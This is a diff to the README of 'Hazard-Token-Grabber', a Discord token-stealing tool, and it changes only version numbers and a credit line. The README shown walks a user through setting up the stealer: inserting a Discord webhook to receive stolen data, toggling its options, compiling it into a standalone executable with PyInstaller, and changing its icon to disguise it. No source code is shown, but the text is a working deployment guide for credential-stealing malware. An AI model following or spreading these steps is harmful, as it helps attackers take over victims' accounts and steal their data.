@@ -1,4 +1,4 @@
-### ☣ Hazard-Token-Grabber-v4 ☣
+### ☣ Hazard-Token-Grabber-v3 ☣
 
 > NOT MY WORK (SKIDDED)
 
@@ -17,13 +17,13 @@ So don't worry, I'm not just a skid - I try my best!
 
 - Step 1: Install python and make sure to add it to path. ![0_7nOyowsPsGI19pZT](https://user-images.githubusercontent.com/96620548/196215300-4d5ecf4a-7f7b-4c4b-9466-2b630873125e.png)
 
-- Step 2: Enter the file named "hazard-v4.py" with any code editor. I would recommend you Visual Studio Code. (https://code.visualstudio.com/)
+- Step 2: Enter the file named "hazard-v3.py" with any code editor. I would recommend you Visual Studio Code. (https://code.visualstudio.com/)
 
 - Step 3: Just put your webhook in line 29 where the code says "WEBHOOK HERE". Simply replace the webhook here with your webhook. You don't know how to create a webhook and copy it's URL? https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
 
 - (Step 4:) You can also change the settings from line 30 to 37. (optional) True is enabling the setting, false is disbaling a setting. Easy!`
 
-- Step 5: How do I compile this shit now? That's pretty easy! Just run this command after you opened a command prompt in the Hazard-Grabber Directory and run this command: "pyinstaller hazard-v4.py --onefile". Now wait for it to compile the file.
+- Step 5: How do I compile this shit now? That's pretty easy! Just run this command after you opened a command prompt in the Hazard-Grabber Directory and run this command: "pyinstaller hazard-v3.py --onefile". Now wait for it to compile the file.
 
 - (Step 6:) Change the ICON. (optional) I don't know good programs for this at the moment. I will try to add this soon. If you know how to do this, let me know under the "Issues" ➤➤  "Suggestions" Tab.
 
@@ -40,4 +40,4 @@ DunklerYeti#9368
 
 *Thanks to everyone who read this ↑↑*
 
-_**Credits to rdmo1 and the real rdimo!!!**_
+_**Credits to rdmo1 and the real Rdimo!!!**_
